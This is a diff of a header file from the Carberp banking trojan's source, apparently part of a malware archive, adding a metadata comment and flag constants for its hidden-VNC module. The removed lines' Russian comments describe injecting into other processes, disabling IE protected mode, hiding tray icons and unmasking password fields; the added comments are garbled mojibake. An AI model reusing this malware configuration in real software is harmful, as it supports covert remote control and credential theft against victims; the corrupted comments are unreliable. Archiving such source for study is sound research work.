@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef XVNC_H_INCLUDED
 #define XVNC_H_INCLUDED
 
@@ -15,19 +26,19 @@ struct PASSWORD_ITEM
 #define VNC_FLAG_ALLOWFILETRANSFER 4
 #endif
 
-#define HVNC_NO_SHELL                       0x0001 ///не запускать explorer
-#define HVNC_NO_INJECTS                     0x0002 ///не инжектировать код в чужие процессы
-#define HVNC_SCREEN_SIZE_DETERMINED         0x0004 ///размер экрана задан
-#define HVNC_NO_VNC_CURSOR                  0x0008 ///не передавать координаты курсора VNC-клиенту
-#define HVNC_USE_BITBLT                     0x0010 ///использовать BitBlt вместо PrintWindow (для input-десктопа)
-#define HVNC_NO_CPU_LIMITS                  0x0020 ///не ограничивать количество процессорного времени
-#define HVNC_DRAW_USER_CURSOR               0x0040 ///рисовать пользовательский курсор (не VNC!)
-#define HVNC_DONT_HIDE_JAVA_ICON            0x0080 ///не скрывать значек жабы из трея
-#define HVNC_DONT_DISABLE_IE_SAFEMODE       0x0100 ///не отключать защищенный режим IE
-#define HVNC_DONT_DISABLE_EFFECTS           0x0200 ///не отключать эффекты
-#define HVNC_NO_WINDOWS_MANIPULATION_TRICK  0x0400 ///обычное переключение окон (без трюка с MessageBox)
-#define HVNC_DONT_DISABLE_THEMES            0x0800 ///не отключать темы
-#define HVNC_NO_ES_PASSWORD_RESET           0x1000 ///не сбрасывать флаг ES_PASSWORD
+#define HVNC_NO_SHELL                       0x0001 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ explorer
+#define HVNC_NO_INJECTS                     0x0002 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define HVNC_SCREEN_SIZE_DETERMINED         0x0004 ///пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+#define HVNC_NO_VNC_CURSOR                  0x0008 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ VNC-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define HVNC_USE_BITBLT                     0x0010 ///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BitBlt пїЅпїЅпїЅпїЅпїЅпїЅ PrintWindow (пїЅпїЅпїЅ input-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+#define HVNC_NO_CPU_LIMITS                  0x0020 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define HVNC_DRAW_USER_CURSOR               0x0040 ///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ VNC!)
+#define HVNC_DONT_HIDE_JAVA_ICON            0x0080 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
+#define HVNC_DONT_DISABLE_IE_SAFEMODE       0x0100 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ IE
+#define HVNC_DONT_DISABLE_EFFECTS           0x0200 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define HVNC_NO_WINDOWS_MANIPULATION_TRICK  0x0400 ///пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ MessageBox)
+#define HVNC_DONT_DISABLE_THEMES            0x0800 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+#define HVNC_NO_ES_PASSWORD_RESET           0x1000 ///пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ ES_PASSWORD
 
 #define NO_HACK_AND_TRICKS                  HVNC_DONT_HIDE_JAVA_ICON+HVNC_DONT_DISABLE_IE_SAFEMODE+HVNC_DONT_DISABLE_EFFECTS+HVNC_NO_WINDOWS_MANIPULATION_TRICK
 
